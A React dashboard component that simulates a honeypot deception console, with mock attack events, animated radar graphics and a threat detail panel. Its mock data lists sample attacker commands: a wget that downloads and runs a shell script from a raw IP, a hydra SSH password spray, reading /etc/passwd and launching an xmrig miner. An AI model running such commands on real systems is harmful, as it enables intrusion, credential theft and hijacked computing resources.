'use client'

import React, { useEffect, useRef, useState } from 'react'

interface ThreatEvent {
  id: string
  ip: string
  country: string
  city: string
  isp: string
  honeypot_type: string
  event_type: string
  risk_score: number
  commands: string[]
  ai_summary: string
  created_at: string
}

interface ShieldStats {
  total_scans: number
  quarantined: number
  unique_origins: string[]
  deflection_rate: number
}

interface VectorPath {
  id: string
  startX: number
  startY: number
  currentX: number
  currentY: number
  targetX: number
  targetY: number
  speed: number
  progress: number
  color: string
  isDeflected: boolean
  event: ThreatEvent
}

interface DecoyNode {
  id: string
  name: string
  angle: number
  distance: number
  pulse: number
  activeThreats: number
}

const MOCK_COUNTRIES = ['Germany', 'United States', 'China', 'Netherlands', 'Russia', 'Japan', 'Brazil', 'India']
const MOCK_ISPS = ['DigitalOcean, LLC', 'Amazon Technologies Inc.', 'OVH SAS', 'Chinanet', 'Comcast Cable', 'Linode, LLC']
const MOCK_HONEYPOTS = ['cowrie_ssh', 'conpot_ics', 'dionaea_malware', 'honeytrap_ext']
const MOCK_EVENT_TYPES = ['credential_spray', 'port_scan', 'exploit_attempt', 'rce_payload']
const MOCK_COMMANDS = [
  ['uname -a', 'wget http://91.185.10.45/bin.sh', 'chmod +x bin.sh', './bin.sh'],
  ['cat /etc/passwd', 'hydra -L root_users.txt -P secret_pass.txt ssh://localhost'],
  ['docker ps -a', 'docker run -d --restart always xmrig-daemon'],
  ['sh', 'whoami', 'id', 'curl -s http://ip-api.com/json']
]
const MOCK_AI_SUMMARIES = [
  "Attacker successfully baited into high-interaction SSH container. Deception layer fed fake password structures. Execution logged and contained safely.",
  "Automated scanner targeting SCADA network port 502. Deflected to simulated virtual grid. Real-time logging suggests signature exploits mapping grid footprints.",
  "Malware drop injection halted. Payload sandbox layer successfully trapped binary. Extracted hash indicates known Linux.Mirai variant.",
  "Passive reconnaissance logged inside mock database. Synthetic schema fed back to attacker's injection script. Intruder metrics fully isolated."
]

function timeAgo(dateString: string): string {
  try {
    const s = Math.floor((Date.now() - new Date(dateString).getTime()) / 1000)
    if (s < 60) return `${s}s ago`
    if (s < 3600) return `${Math.floor(s / 60)}m ago`
    return `${Math.floor(s / 3600)}h ago`
  } catch (err) {
    return 'just now'
  }
}

function getRiskMetadata(score: number) {
  if (score >= 85) return { label: 'CRITICAL', color: '#f87171', border: 'rgba(248,113,113,0.2)', bg: 'rgba(248,113,113,0.04)' }
  if (score >= 60) return { label: 'ELEVATED', color: '#fb923c', border: 'rgba(251,146,60,0.2)', bg: 'rgba(251,146,60,0.04)' }
  return { label: 'MINIMAL', color: '#4ade80', border: 'rgba(74,222,128,0.2)', bg: 'rgba(74,222,128,0.04)' }
}

function generateInitialMockData(): ThreatEvent[] {
  const events: ThreatEvent[] = []
  for (let i = 0; i < 8; i++) {
    const risk_score = Math.floor(Math.random() * 70) + 30
    const country = MOCK_COUNTRIES[Math.floor(Math.random() * MOCK_COUNTRIES.length)]
    events.push({
      id: `evt-sentinel-${i}-${Math.random().toString(36).substring(2, 6)}`,
      ip: `185.220.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 254) + 1}`,
      country,
      city: country === 'Germany' ? 'Brandenburg' : 'Gateway Grid',
      isp: MOCK_ISPS[Math.floor(Math.random() * MOCK_ISPS.length)],
      honeypot_type: MOCK_HONEYPOTS[Math.floor(Math.random() * MOCK_HONEYPOTS.length)],
      event_type: MOCK_EVENT_TYPES[Math.floor(Math.random() * MOCK_EVENT_TYPES.length)],
      risk_score,
      commands: risk_score > 50 ? MOCK_COMMANDS[Math.floor(Math.random() * MOCK_COMMANDS.length)] : [],
      ai_summary: MOCK_AI_SUMMARIES[Math.floor(Math.random() * MOCK_AI_SUMMARIES.length)],
      created_at: new Date(Date.now() - (i * 5 * 60000)).toISOString()
    })
  }
  return events
}

function generateNewAttack(existingCountries: string[]): ThreatEvent {
  const risk_score = Math.floor(Math.random() * 80) + 20
  const country = MOCK_COUNTRIES[Math.floor(Math.random() * MOCK_COUNTRIES.length)]
  return {
    id: `live-sentinel-${Math.random().toString(36).substring(2, 7)}`,
    ip: `185.220.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 254) + 1}`,
    country,
    city: country === 'Germany' ? 'Brandenburg Gate' : 'Secure Perimeter',
    isp: MOCK_ISPS[Math.floor(Math.random() * MOCK_ISPS.length)],
    honeypot_type: MOCK_HONEYPOTS[Math.floor(Math.random() * MOCK_HONEYPOTS.length)],
    event_type: MOCK_EVENT_TYPES[Math.floor(Math.random() * MOCK_EVENT_TYPES.length)],
    risk_score,
    commands: risk_score > 50 ? MOCK_COMMANDS[Math.floor(Math.random() * MOCK_COMMANDS.length)] : [],
    ai_summary: MOCK_AI_SUMMARIES[Math.floor(Math.random() * MOCK_AI_SUMMARIES.length)],
    created_at: new Date().toISOString()
  }
}

export default function AegisSentinelDashboard() {
  const canvasRef = useRef<HTMLCanvasElement>(null)
  const pulseCanvasRef = useRef<HTMLCanvasElement>(null)
  
  const [events, setEvents] = useState<ThreatEvent[]>([])
  const [stats, setStats] = useState<ShieldStats | null>(null)
  const [selected, setSelected] = useState<ThreatEvent | null>(null)
  
  const [decoyMagnetism, setDecoyMagnetism] = useState<number>(78)
  const [interceptionBuffer, setInterceptionBuffer] = useState<number>(62)
  const [systemState, setSystemState] = useState<'DEVIATING' | 'SHIELD_ENGAGED' | 'QUARANTINE_LOCK'>('SHIELD_ENGAGED')

  const vectorsRef = useRef<VectorPath[]>([])
  const decoysRef = useRef<DecoyNode[]>([
    { id: 'dc-1', name: 'DECOY ALPHA (Port 22)', angle: 0, distance: 130, pulse: 0, activeThreats: 2 },
    { id: 'dc-2', name: 'DECOY BETA (Modbus 502)', angle: Math.PI * 0.67, distance: 130, pulse: 1, activeThreats: 1 },
    { id: 'dc-3', name: 'DECOY GAMMA (Oracle DB)', angle: Math.PI * 1.33, distance: 130, pulse: 2, activeThreats: 4 }
  ])
  const pulseDataRef = useRef<number[]>(Array(50).fill(0.15))
  const radarSweepAngleRef = useRef(0)

  useEffect(() => {
    const initialEvents = generateInitialMockData()
    setEvents(initialEvents)
    setSelected(initialEvents[0])
    
    setStats({
      total_scans: 1422,
      quarantined: 89,
      unique_origins: ['Germany', 'United States', 'China', 'Russia', 'Netherlands'],
      deflection_rate: 98.4
    })

    const attackSimulation = setInterval(() => {
      const isHigh = Math.random() > 0.4
      const newThreat = generateNewAttack(stats?.unique_origins || [])
      
      setEvents(prev => [newThreat, ...prev.slice(0, 11)])
      
      setStats(prev => {
        if (!prev) return null
        const isNewCountry = !prev.unique_origins.includes(newThreat.country)
        return {
          total_scans: prev.total_scans + 1,
          quarantined: prev.quarantined + (isHigh ? 1 : 0),
          unique_origins: isNewCountry ? [...prev.unique_origins, newThreat.country] : prev.unique_origins,
          deflection_rate: parseFloat((98 + Math.random() * 1.8).toFixed(1))
        }
      })

      const canvas = canvasRef.current
      if (canvas) {
        const W = canvas.width
        const H = canvas.height
        const spawnSides = ['TOP', 'BOTTOM', 'LEFT', 'RIGHT']
        const side = spawnSides[Math.floor(Math.random() * spawnSides.length)]
        let sx = 0, sy = 0
        if (side === 'TOP') { sx = Math.random() * W; sy = 0 }
        else if (side === 'BOTTOM') { sx = Math.random() * W; sy = H }
        else if (side === 'LEFT') { sx = 0; sy = Math.random() * H }
        else { sx = W; sy = Math.random() * H }

        const targetDecoy = decoysRef.current[Math.floor(Math.random() * decoysRef.current.length)]
        const targetAngle = targetDecoy.angle
        const targetX = W / 2 + Math.cos(targetAngle) * targetDecoy.distance
        const targetY = H / 2 + Math.sin(targetAngle) * targetDecoy.distance

        const riskMeta = getRiskMetadata(newThreat.risk_score)

        vectorsRef.current.push({
          id: Math.random().toString(),
          startX: sx,
          startY: sy,
          currentX: sx,
          currentY: sy,
          targetX,
          targetY,
          speed: 0.01 + Math.random() * 0.008,
          progress: 0,
          color: riskMeta.color,
          isDeflected: false,
          event: newThreat
        })
      }
    }, 6000)

    return () => clearInterval(attackSimulation)
  }, [])

  useEffect(() => {
    const pulseTick = setInterval(() => {
      const baseLoad = systemState === 'QUARANTINE_LOCK' ? 0.45 : 0.15
      const variation = Math.random() * 0.12 * (decoyMagnetism / 50)
      pulseDataRef.current.push(baseLoad + variation)
      if (pulseDataRef.current.length > 50) {
        pulseDataRef.current.shift()
      }
      
      const pCanvas = pulseCanvasRef.current
      if (pCanvas) {
        const ctx = pCanvas.getContext('2d')
        if (ctx) {
          ctx.clearRect(0, 0, pCanvas.width, pCanvas.height)
          ctx.strokeStyle = '#3b82f6'
          ctx.lineWidth = 1.5
          ctx.beginPath()
          pulseDataRef.current.forEach((val, i) => {
            const x = (i / 49) * pCanvas.width
            const y = pCanvas.height - (val * pCanvas.height * 0.8) - 4
            if (i === 0) ctx.moveTo(x, y)
            else ctx.lineTo(x, y)
          })
          ctx.stroke()
        }
      }
    }, 400)

    return () => clearInterval(pulseTick)
  }, [decoyMagnetism, systemState])

  useEffect(() => {
    const canvas = canvasRef.current
    if (!canvas) return
    const ctx = canvas.getContext('2d')
    if (!ctx) return

    let animationId = 0

    function drawVectorGrid() {
      // Explicitly check and assert both canvas and context are available to fix the TypeScript error
      const currentCanvas = canvasRef.current
      const currentCtx = canvasRef.current?.getContext('2d')
      if (!currentCanvas || !currentCtx) return

      const W = currentCanvas.width
      const H = currentCanvas.height
      const cx = W / 2
      const cy = H / 2

      currentCtx.clearRect(0, 0, W, H)

      currentCtx.fillStyle = '#06080b'
      currentCtx.fillRect(0, 0, W, H)

      currentCtx.strokeStyle = 'rgba(255,255,255,0.015)'
      currentCtx.lineWidth = 0.5
      const gridGap = 40
      for (let x = 0; x < W; x += gridGap) {
        currentCtx.beginPath(); currentCtx.moveTo(x, 0); currentCtx.lineTo(x, H); currentCtx.stroke()
      }
      for (let y = 0; y < H; y += gridGap) {
        currentCtx.beginPath(); currentCtx.moveTo(0, y); currentCtx.lineTo(W, y); currentCtx.stroke()
      }

      currentCtx.strokeStyle = 'rgba(59,130,246,0.05)'
      for (let r = 70; r <= 210; r += 70) {
        currentCtx.beginPath()
        currentCtx.arc(cx, cy, r, 0, Math.PI * 2)
        currentCtx.stroke()
      }

      currentCtx.strokeStyle = 'rgba(255,255,255,0.03)'
      currentCtx.beginPath()
      currentCtx.moveTo(cx - 240, cy); currentCtx.lineTo(cx + 240, cy)
      currentCtx.moveTo(cx, cy - 240); currentCtx.lineTo(cx, cy + 240)
      currentCtx.stroke()

      radarSweepAngleRef.current += 0.005
      const gradient = currentCtx.createRadialGradient(cx, cy, 10, cx, cy, 220)
      gradient.addColorStop(0, 'rgba(59,130,246,0.02)')
      gradient.addColorStop(0.5, 'rgba(59,130,246,0.005)')
      gradient.addColorStop(1, 'rgba(0,0,0,0)')
      currentCtx.fillStyle = gradient
      currentCtx.beginPath()
      currentCtx.moveTo(cx, cy)
      currentCtx.arc(cx, cy, 220, radarSweepAngleRef.current - 0.2, radarSweepAngleRef.current)
      currentCtx.closePath()
      currentCtx.fill()

      currentCtx.beginPath()
      currentCtx.arc(cx, cy, 18, 0, Math.PI * 2)
      currentCtx.fillStyle = '#0a0d14'
      currentCtx.fill()
      currentCtx.strokeStyle = systemState === 'QUARANTINE_LOCK' ? '#ef4444' : '#3b82f6'
      currentCtx.lineWidth = 2
      currentCtx.stroke()

      const pulseRadius = 18 + Math.abs(Math.sin(Date.now() / 300)) * 6
      currentCtx.strokeStyle = systemState === 'QUARANTINE_LOCK' ? 'rgba(239,68,68,0.2)' : 'rgba(59,130,246,0.2)'
      currentCtx.lineWidth = 1
      currentCtx.beginPath()
      currentCtx.arc(cx, cy, pulseRadius, 0, Math.PI * 2)
      currentCtx.stroke()

      currentCtx.fillStyle = systemState === 'QUARANTINE_LOCK' ? '#ef4444' : '#60a5fa'
      currentCtx.beginPath()
      currentCtx.arc(cx, cy, 4, 0, Math.PI * 2)
      currentCtx.fill()

      currentCtx.font = '8px monospace'
      currentCtx.fillStyle = 'rgba(255,255,255,0.35)'
      currentCtx.textAlign = 'center'
      currentCtx.fillText('PROTECTED CORE', cx, cy - 24)

      decoysRef.current.forEach(decoy => {
        decoy.pulse += 0.05
        const dx = cx + Math.cos(decoy.angle) * decoy.distance
        const dy = cy + Math.sin(decoy.angle) * decoy.distance

        currentCtx.strokeStyle = 'rgba(59,130,246,0.08)'
        currentCtx.beginPath()
        currentCtx.arc(cx, cy, decoy.distance, decoy.angle - 0.1, decoy.angle + 0.1)
        currentCtx.stroke()

        currentCtx.beginPath()
        currentCtx.arc(dx, dy, 7, 0, Math.PI * 2)
        currentCtx.fillStyle = '#0c1220'
        currentCtx.fill()
        currentCtx.strokeStyle = '#10b981'
        currentCtx.lineWidth = 1.5
        currentCtx.stroke()

        const decoyPulse = 7 + Math.sin(decoy.pulse) * 4
        currentCtx.strokeStyle = 'rgba(16,185,129,0.15)'
        currentCtx.beginPath()
        currentCtx.arc(dx, dy, decoyPulse, 0, Math.PI * 2)
        currentCtx.stroke()

        currentCtx.font = '8px monospace'
        currentCtx.fillStyle = 'rgba(16,185,129,0.6)'
        currentCtx.textAlign = 'left'
        currentCtx.fillText(decoy.name, dx + 12, dy + 3)
      })

      vectorsRef.current.forEach((vec) => {
        vec.progress += vec.speed
        if (vec.progress > 1) {
          vec.progress = 1
        }

        const midX = cx + (vec.startX - cx) * 0.4
        const midY = cy + (vec.startY - cy) * 0.4

        let px = 0, py = 0
        if (vec.progress < 0.5) {
          const factor = vec.progress * 2
          px = vec.startX + (midX - vec.startX) * factor
          py = vec.startY + (midY - vec.startY) * factor
        } else {
          const factor = (vec.progress - 0.5) * 2
          px = midX + (vec.targetX - midX) * factor
          py = midY + (vec.targetY - midY) * factor
          vec.isDeflected = true
        }

        vec.currentX = px
        vec.currentY = py

        currentCtx.strokeStyle = `rgba(255,255,255,0.03)`
        currentCtx.lineWidth = 0.8
        currentCtx.beginPath()
        currentCtx.moveTo(vec.startX, vec.startY)
        currentCtx.quadraticCurveTo(midX, midY, px, py)
        currentCtx.stroke()

        currentCtx.beginPath()
        currentCtx.arc(px, py, 3, 0, Math.PI * 2)
        currentCtx.fillStyle = vec.color
        currentCtx.fill()

        currentCtx.strokeStyle = `${vec.color}35`
        currentCtx.beginPath()
        currentCtx.arc(px, py, 8 + Math.sin(Date.now() / 150) * 3, 0, Math.PI * 2)
        currentCtx.stroke()

        const isCurrentSelected = selected?.id === vec.event.id
        if (isCurrentSelected) {
          currentCtx.strokeStyle = vec.color
          currentCtx.lineWidth = 1
          currentCtx.setLineDash([2, 4])
          currentCtx.beginPath()
          currentCtx.moveTo(cx, cy)
          currentCtx.lineTo(px, py)
          currentCtx.stroke()
          currentCtx.setLineDash([])

          currentCtx.strokeStyle = '#ffffff'
          currentCtx.beginPath()
          currentCtx.arc(px, py, 14, 0, Math.PI * 2)
          currentCtx.stroke()
        }
      })

      vectorsRef.current = vectorsRef.current.filter(v => v.progress < 1)
    }

    function renderLoop() {
      drawVectorGrid()
      animationId = requestAnimationFrame(renderLoop)
    }

    renderLoop()

    return () => {
      cancelAnimationFrame(animationId)
    }
  }, [selected, systemState])

  function handleGridClick(e: React.MouseEvent<HTMLCanvasElement>) {
    const canvas = canvasRef.current
    if (!canvas) return
    const rect = canvas.getBoundingClientRect()
    const mx = e.clientX - rect.left
    const my = e.clientY - rect.top

    let nearest: VectorPath | null = null
    let minDist = 25

    vectorsRef.current.forEach(v => {
      const dx = v.currentX - mx
      const dy = v.currentY - my
      const dist = Math.sqrt(dx * dx + dy * dy)
      if (dist < minDist) {
        minDist = dist
        nearest = v
      }
    })

    if (nearest) {
      setSelected((nearest as VectorPath).event)
    }
  }

  const threatRisk = selected ? getRiskMetadata(selected.risk_score) : null

  return (
    <>
      <style>{`
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #050608; overflow: hidden; color: #e2e8f0; }
        
        .sentinel-card {
          background: #080b10;
          border: 1px solid rgba(255, 255, 255, 0.04);
        }
        .sentinel-border-glow {
          box-shadow: inset 0 0 12px rgba(59,130,246,0.03), 0 0 20px rgba(0,0,0,0.8);
        }
        .brutalist-grid {
          background-image: linear-gradient(rgba(255,255,255,0.01) 1px, transparent 1px),
                            linear-gradient(90deg, rgba(255,255,255,0.01) 1px, transparent 1px);
          background-size: 20px 20px;
        }
        .text-micro {
          font-size: 9px;
          letter-spacing: 0.15em;
        }
        ::-webkit-scrollbar { width: 3px; height: 3px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: rgba(59,130,246,0.15); border-radius: 1px; }
        ::-webkit-scrollbar-thumb:hover { background: rgba(59,130,246,0.3); }
      `}</style>

      <div style={{ background: '#050608', fontFamily: 'monospace', height: '100vh', display: 'grid', gridTemplateColumns: '260px 1fr 340px', overflow: 'hidden' }} className="brutalist-grid select-none">

        {/* ==================== LEFT TACTICAL INSTRUMENT OVERLAY ==================== */}
        <div style={{ borderRight: '1px solid rgba(255,255,255,0.05)', background: '#06080b', display: 'flex', flexDirection: 'column', overflow: 'hidden', position: 'relative' }}>
          
          <div style={{ padding: '20px 16px', borderBottom: '1px solid rgba(255,255,255,0.05)', display: 'flex', alignItems: 'center', gap: '12px' }}>
            <div style={{ width: '28px', height: '28px', border: '1px solid #3b82f6', display: 'flex', alignItems: 'center', justifyItems: 'center', justifyContent: 'center' }}>
              <div style={{ width: '12px', height: '12px', background: '#3b82f6', transform: 'rotate(45deg)' }} />
            </div>
            <div>
              <div style={{ fontSize: '12px', fontWeight: 700, color: '#ffffff', letterSpacing: '1px' }}>AEGIS SENTINEL</div>
              <div style={{ fontSize: '8px', color: 'rgba(255,255,255,0.4)', letterSpacing: '2px', marginTop: '2px' }}>DECEPTION CHAMBER</div>
            </div>
          </div>

          <div style={{ padding: '16px', display: 'flex', flexDirection: 'column', gap: '16px', borderBottom: '1px solid rgba(255,255,255,0.05)' }}>
            
            <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between' }} className="text-micro font-bold">
                <span className="text-slate-400">DECOY ATTRACTOR</span>
                <span className="text-emerald-400">{decoyMagnetism}%</span>
              </div>
              <input 
                type="range" 
                min="10" 
                max="100" 
                value={decoyMagnetism}
                onChange={(e) => setDecoyMagnetism(parseInt(e.target.value))}
                style={{ WebkitAppearance: 'none', background: 'rgba(255,255,255,0.05)', height: '4px', borderRadius: '2px', outline: 'none' }}
              />
              <div style={{ fontSize: '8px', color: 'rgba(255,255,255,0.3)' }}>Deflection magnetism target pull.</div>
            </div>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between' }} className="text-micro font-bold">
                <span className="text-slate-400">INTERCEPTION SHUTTER</span>
                <span className="text-blue-400">{interceptionBuffer}ms</span>
              </div>
              <input 
                type="range" 
                min="20" 
                max="200" 
                value={interceptionBuffer}
                onChange={(e) => setInterceptionBuffer(parseInt(e.target.value))}
                style={{ WebkitAppearance: 'none', background: 'rgba(255,255,255,0.05)', height: '4px', borderRadius: '2px', outline: 'none' }}
              />
              <div style={{ fontSize: '8px', color: 'rgba(255,255,255,0.3)' }}>Honeypot mirror delay coefficient.</div>
            </div>

          </div>

          <div style={{ padding: '16px', display: 'flex', flexDirection: 'column', gap: '8px', borderBottom: '1px solid rgba(255,255,255,0.05)' }}>
            <span className="text-micro font-bold text-slate-400">DEFENSIVE OPERATIONAL PROFILE</span>
            <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
              {[
                { key: 'DEVIATING', label: 'DECOY OVER-ROUTE' },
                { key: 'SHIELD_ENGAGED', label: 'SHIELD ACTIVE (AUTO)' },
                { key: 'QUARANTINE_LOCK', label: 'QUARANTINE SHUTDOWN' }
              ].map(m => (
                <button
                  key={m.key}
                  onClick={() => setSystemState(m.key as any)}
                  style={{
                    background: systemState === m.key ? 'rgba(59,130,246,0.08)' : 'transparent',
                    border: systemState === m.key ? '1px solid #3b82f6' : '1px solid rgba(255,255,255,0.05)',
                    color: systemState === m.key ? '#60a5fa' : '#94a3b8',
                    padding: '8px',
                    fontSize: '10px',
                    textAlign: 'left',
                    cursor: 'pointer',
                    fontWeight: 'bold',
                    transition: 'all 0.15s'
                  }}>
                  {m.label}
                </button>
              ))}
            </div>
          </div>

          <div style={{ padding: '16px', borderBottom: '1px solid rgba(255,255,255,0.05)' }}>
            <span className="text-micro font-bold text-slate-400 block mb-2">VECTOR INGESTION BANDWIDTH</span>
            <canvas ref={pulseCanvasRef} width={226} height={42} style={{ width: '100%', height: '42px', background: '#040507' }} />
          </div>

          <div style={{ flex: 1, overflow: 'hidden', display: 'flex', flexDirection: 'column', padding: '16px 12px' }}>
            <span className="text-micro font-bold text-slate-400 block mb-3">TELEMETRY STREAMS</span>
            <div style={{ flex: 1, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: '6px' }} className="pr-1">
              {events.length === 0 ? (
                <div style={{ fontSize: '10px', color: 'rgba(255,255,255,0.15)', textAlign: 'center', paddingTop: '20px' }}>Scanning empty perimeter...</div>
              ) : events.map(e => {
                const isCur = selected?.id === e.id
                const riskMeta = getRiskMetadata(e.risk_score)
                return (
                  <div 
                    key={e.id}
                    onClick={() => setSelected(e)}
                    style={{
                      padding: '8px',
                      background: isCur ? 'rgba(59,130,246,0.05)' : '#080b10',
                      borderLeft: `2px solid ${isCur ? '#3b82f6' : riskMeta.color}`,
                      borderRight: '1px solid rgba(255,255,255,0.03)',
                      borderTop: '1px solid rgba(255,255,255,0.03)',
                      borderBottom: '1px solid rgba(255,255,255,0.03)',
                      cursor: 'pointer',
                      transition: 'all 0.15s'
                    }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'baseline' }}>
                      <span style={{ fontSize: '11px', fontWeight: 'bold', color: isCur ? '#ffffff' : '#e2e8f0' }}>{e.ip}</span>
                      <span style={{ fontSize: '8px', color: riskMeta.color }}>{e.risk_score}%</span>
                    </div>
                    <div style={{ fontSize: '9px', color: 'rgba(255,255,255,0.3)', marginTop: '4px', display: 'flex', justifyContent: 'space-between' }}>
                      <span>{e.event_type.replace(/_/g, ' ').toUpperCase()}</span>
                      <span>{timeAgo(e.created_at)}</span>
                    </div>
                  </div>
                )
              })}
            </div>
          </div>

        </div>

        {/* ==================== CENTRAL ADAPTIVE RADAR GRID ==================== */}
        <div style={{ position: 'relative', display: 'flex', flexDirection: 'column', background: '#06080b' }}>
          
          <div style={{ borderBottom: '1px solid rgba(255,255,255,0.05)', padding: '16px 20px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', background: '#06080b' }}>
            <div style={{ display: 'flex', gap: '20px' }} className="text-micro">
              <div>SYSTEM DEFLECTS: <span className="text-[#10b981] font-bold">{stats ? `${stats.deflection_rate}%` : '—'}</span></div>
              <div>SCAN CAPACITY: <span className="text-white">OPTIMAL</span></div>
            </div>
            <div style={{ fontSize: '9px', color: 'rgba(255,255,255,0.3)' }}>AEGIS SENTINEL v4.11</div>
          </div>

          <div style={{ flex: 1, position: 'relative' }}>
            <canvas 
              ref={canvasRef} 
              width={650} 
              height={550} 
              onClick={handleGridClick}
              style={{ position: 'absolute', inset: 0, width: '100%', height: '100%' }} 
            />
          </div>

          <div style={{ position: 'absolute', bottom: '16px', left: '16px', pointerEvents: 'none', display: 'flex', gap: '24px' }} className="text-micro">
            <div>AZIMUTH: <span className="text-slate-400">S240.85</span></div>
            <div>RANGE: <span className="text-slate-400">4.5 KM</span></div>
            <div>STATUS: <span className="text-emerald-400 font-bold">MONITORING</span></div>
          </div>

        </div>

        {/* ==================== RIGHT CLASSIFIED PERIMETER ANALYSIS DOSSIER ==================== */}
        <div style={{ borderLeft: '1px solid rgba(255,255,255,0.05)', background: '#06080b', padding: '24px 18px', overflowY: 'auto', display: 'flex', flexDirection: 'column' }}>
          
          {!selected ? (
            <div style={{ color: 'rgba(255,255,255,0.2)', fontSize: '11px', textAlign: 'center', marginTop: '120px', lineHeight: 2 }}>
              <div style={{ fontSize: '32px', color: 'rgba(59,130,246,0.3)', marginBottom: '8px' }}>⌖</div>
              NO TARGET SECTOR LOCKED<br />
              CLICK AN ACTIVE ATTACK PATH ON THE CENTRAL RESOLVER RADAR
            </div>
          ) : (
            <div style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
              
              <div style={{ borderBottom: '1px solid rgba(255,255,255,0.08)', paddingBottom: '14px', position: 'relative' }}>
                <span className="text-micro font-bold text-slate-500">TACTICAL DOSSIER CASE FILE // ACTIVE TARGET</span>
                <h2 style={{ fontSize: '20px', color: '#ffffff', fontWeight: 800, wordBreak: 'break-all', marginTop: '6px' }}>{selected.ip}</h2>
                <div style={{ fontSize: '11px', color: 'rgba(255,255,255,0.4)', marginTop: '3px' }}>
                  {[selected.country, selected.city].filter(Boolean).join(' // ').toUpperCase() || 'UNKNOWN COORDINATES'}
                </div>

                <div style={{ position: 'absolute', top: '15px', right: '0', pointerEvents: 'none' }}>
                  <div style={{ 
                    border: `1.5px solid ${threatRisk?.color || '#ffffff'}`, 
                    color: threatRisk?.color || '#ffffff', 
                    fontSize: '9px', 
                    fontWeight: 900, 
                    padding: '3px 8px', 
                    background: threatRisk?.bg || 'transparent',
                    letterSpacing: '1px'
                  }}>
                    {threatRisk?.label || 'UNKNOWN'}
                  </div>
                </div>
              </div>

              <div style={{ display: 'grid', gridTemplateColumns: '1fr', gap: '8px' }}>
                {[
                  ['DECOY INTERCEPT HUB', selected.honeypot_type.toUpperCase()],
                  ['SIGNATURE PATTERN', selected.event_type.replace(/_/g, ' ').toUpperCase()],
                  ['ROUTED ISP PATHWAY', selected.isp.toUpperCase()],
                  ['DETECTION TIME COORDINATE', new Date(selected.created_at).toUTCString().toUpperCase()]
                ].map(([k, v]) => (
                  <div key={k} style={{ padding: '10px', background: '#080b10', border: '1px solid rgba(255,255,255,0.03)' }}>
                    <div style={{ fontSize: '8px', color: 'rgba(255,255,255,0.3)', letterSpacing: '1px', marginBottom: '4px' }}>{k}</div>
                    <div style={{ fontSize: '11px', color: '#f1f5f9', fontWeight: 500 }}>{v}</div>
                  </div>
                ))}
              </div>

              <div style={{ padding: '12px', background: '#080b10', border: '1px solid rgba(255,255,255,0.03)' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '9px', marginBottom: '6px' }}>
                  <span style={{ color: 'rgba(255,255,255,0.4)', letterSpacing: '1.5px' }}>THREAT MATRIX CALCULATION</span>
                  <span style={{ color: threatRisk?.color || '#ffffff', fontWeight: 'bold' }}>{selected.risk_score}% CRIT</span>
                </div>
                <div style={{ height: '3px', background: 'rgba(255,255,255,0.05)', overflow: 'hidden' }}>
                  <div style={{ width: `${selected.risk_score}%`, height: '100%', background: threatRisk?.color || '#ffffff', transition: 'width 0.6s' }} />
                </div>
              </div>

              <div style={{ padding: '12px', background: '#030406', border: '1px solid rgba(255,255,255,0.05)', borderRadius: '2px' }}>
                <span className="text-micro font-bold text-slate-500 block mb-2">CAPTURE RECORDED EXPLOITS</span>
                {selected.commands && selected.commands.length > 0 ? (
                  <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
                    {selected.commands.map((cmd, i) => (
                      <div key={i} style={{ fontSize: '11px', color: '#34d399', wordBreak: 'break-all' }}>
                        $ <span style={{ color: '#f8fafc' }}>{cmd}</span>
                      </div>
                    ))}
                  </div>
                ) : (
                  <div style={{ fontSize: '9px', color: 'rgba(255,255,255,0.25)', fontStyle: 'italic' }}>
                    Passive probing mapped. No active shell exploits deployed.
                  </div>
                )}
              </div>

              {selected.ai_summary && (
                <div style={{ border: '1px dashed rgba(255,255,255,0.12)', padding: '12px', background: 'rgba(255,255,255,0.01)' }}>
                  <span className="text-micro font-bold text-slate-500 block mb-2">AEGIS ANALYST RECOMMENDATION</span>
                  <p style={{ fontSize: '11px', color: '#cbd5e1', lineHeight: 1.6 }}>
                    {selected.ai_summary}
                  </p>
                </div>
              )}

            </div>
          )}

        </div>

      </div>
    </>
  )
}